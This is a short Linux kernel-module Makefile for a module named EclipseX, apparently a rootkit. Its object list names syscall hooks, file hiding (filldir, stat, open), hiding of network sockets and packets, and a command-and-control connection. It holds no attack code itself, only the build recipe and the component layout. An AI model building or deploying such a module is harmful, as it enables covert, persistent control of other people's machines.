obj-m += EclipseX.o

EclipseX-objs := EclipseX_main.o \
	src/hooks.o \
	src/hide/files/files.o \
	src/hide/files/filldir.o \
	src/hide/files/openx.o \
	src/hide/files/stat.o \
	src/hide/net/net.o \
	src/hide/net/ip_packets.o \
	src/hide/net/sockets.o \
	src/c2/conn_serv.o \
	src/c2/functions/fs_func.o



PWD := $(CURDIR)

all:
	make	-C	/lib/modules/$(shell	uname	-r)/build	M=$(PWD)	modules
 
clean:
	make	-C	/lib/modules/$(shell	uname	-r)/build	M=$(PWD)	clean
